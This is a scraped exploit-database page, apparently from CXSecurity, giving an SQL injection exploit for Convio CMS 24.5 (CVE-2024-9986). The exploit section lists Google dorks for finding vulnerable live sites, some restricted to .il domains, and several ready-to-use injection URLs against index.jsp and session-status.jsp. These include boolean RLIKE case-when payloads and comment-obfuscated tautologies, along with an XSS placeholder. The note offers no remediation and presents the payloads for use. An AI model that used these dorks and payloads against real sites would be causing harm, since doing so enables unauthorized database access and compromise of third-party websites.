---
title: Convoy CMS SQL injection  24.5
url: https://cxsecurity.com/issue/WLB-2024120006
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-12-06
fetch_date: 2025-10-06T19:33:35.422153
---

# Convoy CMS SQL injection  24.5

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Convoy CMS SQL injection 24.5**  **2024.12.05**  **![ir](https://cert.cx/cxstatic/images/flags/ir.png) [E1.Coders](https://cxsecurity.com/author/E1.Coders/1/) **(IR)** ![ir](https://cert.cx/cxstatic/images/flags/ir.png)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2024-9986](https://cxsecurity.com/cveshow/CVE-2024-9986/ "Click to see CVE-2024-9986")**  CWE:  **[CWE-89](https://cxsecurity.com/cwe/%20CWE-89 "Click to see  CWE-89")**  **[**Dork:** site:.com /about/news/index.jsp?page=2 < AND > site:.il /about/news/index.jsp?page=2](https://cxsecurity.com/dorks/)** | |

/\*!
- # VULNERABILITY: Convio CMS SQL injection Vulnerabilities version 24.5 (Work for ALL VERSION 24)
- # Authenticated Persistent SQL injection
- # GOOGLE DORK: site:.com /about/news/index.jsp?page=2
- # GOOGLE DORK: site:.il /about/news/index.jsp?page=2
- # DATE: November 2024
- # SECURITY RESEARCHER: E1.Coders
- # VENDOR: Convio CMS [http://www.convio.com ]
- # SOFTWARE LINK: http://www.convio.com/
- # CVE: CVE-2024-9986
- # CWE: CWE-89
\*/
### -- [ Info: ]
[i] A valid persistent SQL INJECTION vulnerability was discovered in of the Convio version 24.5 website installed.
[i] Vulnerable parameter(s): - inurl:.com /about/news/index.jsp?page=2
### -- [ Impact: ]
[~] Malicious SQL code injections, the ability to combine attack vectors against the targeted system, which can lead to a complete compromise of the resource.
### -- [ Details: ]
[~] vulnerable file is "index.jsp" and "session-status.jsp"
### -- [ EXPLOIT : ]
https://www.TARGET.com/about/news/index.jsp?page=2{sql inject code}
https://www.TARGET.com/about/news/index.jsp?page=2 RLIKE (case when 7273121=7273121 then 0x74657374696E70757476616C7565 else 0x28 end)
https://www.TARGET.com/system/auth/session-status.jsp?nocache=99999999/\*\*/oR/\*\*/5563379=5563379--
https://www.TARGET.com/system/auth/session-status.jsp?nocache=1715702042268%27/\*\*/RLIKE/\*\*/(case/\*\*/when/\*\*//\*\*/4007635=4007635/\*\*/then/\*\*/0x74657374696E70757476616C7565/\*\*/else/\*\*/0x28/\*\*/end)/\*\*/and/\*\*/'%'='
https://www.TARGET.com/search/?q=<XSS SCRIPT BYPASS>
### -- [ Contacts: ]
[+] E-Mail: E1.Coders@Mail.Ru
[+] GitHub: @e1coders

**##### References:**

https://www.cve.org/CVERecord?id=CVE-2024-9986

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024120006)

[Tweet](https://twitter.com/share)

Vote for this issue:
 2
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top